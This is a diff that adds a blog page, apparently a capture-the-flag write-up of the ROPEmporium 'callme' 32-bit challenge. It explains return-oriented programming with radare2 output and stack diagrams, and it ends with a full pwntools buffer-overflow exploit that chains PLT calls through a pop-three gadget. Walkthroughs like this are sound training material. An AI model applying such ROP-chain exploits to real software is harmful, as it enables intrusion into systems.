@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<title>ROPEmporium: callme 32-bit | </title>
+<meta charset="utf-8">
+<meta name="generator" content="Hugo 0.80.0" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" href="https://cavetownie.github.io/css/index.css">
+<link rel="canonical" href="https://cavetownie.github.io/posts/callme32bit/">
+<link rel="alternate" type="application/rss+xml" href="" title="">
+
+<header>
+  
+    <a href="https://cavetownie.github.io/" class="title"></a>
+  
+  
+    <nav>
+    
+      <a href="/">Blog</a>
+    
+      <a href="/about/">About</a>
+    
+      <a href="/challenges/">Challenges</a>
+    
+      <a href="/index.xml">RSS</a>
+    
+    </nav>
+  
+</header>
+
+<article>
+  <header>
+    <h1>ROPEmporium: callme 32-bit</h1>
+    <time datetime="2021-05-24T14:57:00&#43;02:00">May 24, 2021</time>
+  </header>
+  <h1 id="writeup-of-callme-callme-on-ropemporium">Writeup of callme [callme] on ROPEmporium</h1>
+<p>Prerequisites: Basic knowledge of assembly, disassembling tools, the previous challenges, and calling convention</p>
+<hr>
+<p>How do you make consecutive calls to a function from your ROP chain that won&rsquo;t crash afterwards?
+If you keep using the call instructions already present in the binary your chains will eventually fail, especially when exploiting 32 bit binaries. Consider why this might be the case.</p>
+<p>This is the information we&rsquo;re greeted with in the callme challenge.</p>
+<p>What we need to do is call the functions &ldquo;callmeone&rdquo;, &ldquo;callmetwo&rdquo;, &ldquo;callmethree&rdquo; all with the same arguments: 0xdeadbeef, 0xcafebabe, 0xd00df00d.</p>
+<p>Let&rsquo;s look at the binary with radare2:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#f92672">&gt;</span>  <span style="color:#ae81ff">0x08048570</span>   <span style="color:#ae81ff">50</span> entry0                                   
+   <span style="color:#ae81ff">0x080486ed</span>   <span style="color:#ae81ff">98</span> sym.pwnme
+   <span style="color:#ae81ff">0x080484c0</span>    <span style="color:#ae81ff">6</span> sym.imp.read
+   <span style="color:#ae81ff">0x0804874f</span>   <span style="color:#ae81ff">67</span> sym.usefulFunction
+   <span style="color:#ae81ff">0x080484e0</span>    <span style="color:#ae81ff">6</span> sym.imp.callme_three <span style="color:#f92672">&lt;-</span> Call_three
+   <span style="color:#ae81ff">0x08048550</span>    <span style="color:#ae81ff">6</span> sym.imp.callme_two <span style="color:#f92672">&lt;-</span> Call_two
+   <span style="color:#ae81ff">0x080484f0</span>    <span style="color:#ae81ff">6</span> sym.imp.callme_one <span style="color:#f92672">&lt;-</span> Call_one
+   <span style="color:#ae81ff">0x08048686</span>  <span style="color:#ae81ff">103</span> main
+</code></pre></div><p>Okay! So this should be easy. Let&rsquo;s look at the stack we want.</p>
+<pre><code>┌────────────┐
+│            │
+│ 0xd00df00d │
+│            │
+├────────────┤
+│            │
+│ 0xcafebabe │
+│            │
+├────────────┤
+│            │
+│ 0xdeadbeef │
+│            │
+├────────────┤
+│            │
+│ callme_one │
+│            │
+└────────────┘
+</code></pre><p>Now how do we continue with the next callme_two? Just the same principle? Is this even right?
+I tried a payload that went something like this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">payload<span style="color:#f92672">=</span>padding
+payload<span style="color:#f92672">+=</span>callme_one<span style="color:#f92672">+</span>dead<span style="color:#f92672">+</span>cafe<span style="color:#f92672">+</span>dood
+payload<span style="color:#f92672">+=</span>callme_two<span style="color:#f92672">+</span>dead<span style="color:#f92672">+</span>cafe<span style="color:#f92672">+</span>dood
+payload<span style="color:#f92672">+=</span>callme_three<span style="color:#f92672">+</span>dead<span style="color:#f92672">+</span>cafe<span style="color:#f92672">+</span>dood
+</code></pre></div><p>It&rsquo;s important to note, that when a function call is made a new <strong>stack frame</strong> is created. This is to avoid corrupting data outisde a function, and also to save memory. Let&rsquo;s look at a simple python program that explains this quite well:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">test</span>():
+	a <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+	<span style="color:#66d9ef">print</span>(a)
+
+test()
+main()
+</code></pre></div><p>This would yield a &ldquo;NameError: name &lsquo;a&rsquo; is not defined&rdquo;. To return from a function, it&rsquo;s important that the function has a return address. The return address is the first thing that will be pushed onto the stack after a function call.</p>
+<p>We simply need some sort of way to return back after our function. It&rsquo;s also important to note, that we push data on to the stack, that shouldn&rsquo;t be there in the first place, this can cause issues when returning, as the program might interpret these in a different way then. We simply make our chain like this:</p>
+<pre><code>payload = callme_one+pop3+argv1+argv2+argv3
+payload += callme_two+pop3+argv1+argv2+argv3
+payload += callme_three+argv1+argv2+argv3
+</code></pre><p>This firstly puts the pop3 as the return address after the function has been called. So it calls callme_one with the three arguments, then returns to pop3 which places these into registers, and removes them from the stack. Then it calls the next function, with the three arguments and afterwards places these into registers, effectively removing them from the stack. Lastly it calls callme_three and&hellip; flag</p>
+<p>Exploit:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+usefulFunction <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x4f\x87\x04\x08</span><span style="color:#e6db74">&#34;</span>
+callmeone <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x08048780</span>) <span style="color:#75715e">#b&#34;\x80\x87\x04\x08&#34;</span>
+callme_one_plt <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x080484f0</span>)
+callme_two_plt <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x08048550</span>)
+callmethree <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x0804875e</span>)
+
+dbef <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>)
+cfbb <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0xcafebabe</span>)
+dfd <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0xd00df00d</span>)
+
+completeargv<span style="color:#f92672">=</span>dbef<span style="color:#f92672">+</span>cfbb<span style="color:#f92672">+</span>dfd
+
+gdgtpopm <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x080487f9</span>) <span style="color:#75715e">#pops three registers</span>
+
+elfPath<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;./callme32&#34;</span>
+context<span style="color:#f92672">.</span>arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;i386&#34;</span>
+
+gdbscript<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">break *0x080484f0
+</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+
+terminalSetting <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;gnome-terminal&#39;</span>, <span style="color:#e6db74">&#39;-e&#39;</span>]
+context<span style="color:#f92672">.</span>clear(terminal<span style="color:#f92672">=</span>terminalSetting)
+
+
+io <span style="color:#f92672">=</span> pwnlib<span style="color:#f92672">.</span>gdb<span style="color:#f92672">.</span>debug(elfPath, gdbscript <span style="color:#f92672">=</span> gdbscript)
+
+<span style="color:#75715e">#mnm = cyclic_gen()</span>
+<span style="color:#75715e">#mnm = mnm.get(80)</span>
+point<span style="color:#f92672">=</span>cyclic_find(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;laaa&#34;</span>, endian<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;little&#34;</span>)
+<span style="color:#75715e">#6161616c is at the return or laaa</span>
+
+
+<span style="color:#75715e">#https://en.wikibooks.org/wiki/X86_Disassembly/Functions_and_Stack_Frames</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+    <span style="color:#66d9ef">print</span>(io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;&gt; &#34;</span>))
+    payload<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>point
+    payload<span style="color:#f92672">+=</span>callme_one_plt<span style="color:#f92672">+</span>gdgtpopm<span style="color:#f92672">+</span>completeargv
+    payload<span style="color:#f92672">+=</span>callme_two_plt<span style="color:#f92672">+</span>gdgtpopm<span style="color:#f92672">+</span>completeargv  
+    payload<span style="color:#f92672">+=</span>callmethree<span style="color:#f92672">+</span>completeargv  
+
+    io<span style="color:#f92672">.</span>send(payload)
+    io<span style="color:#f92672">.</span>interactive()
+
+main()
+</code></pre></div>
+</article>
+
+
+
+</html>
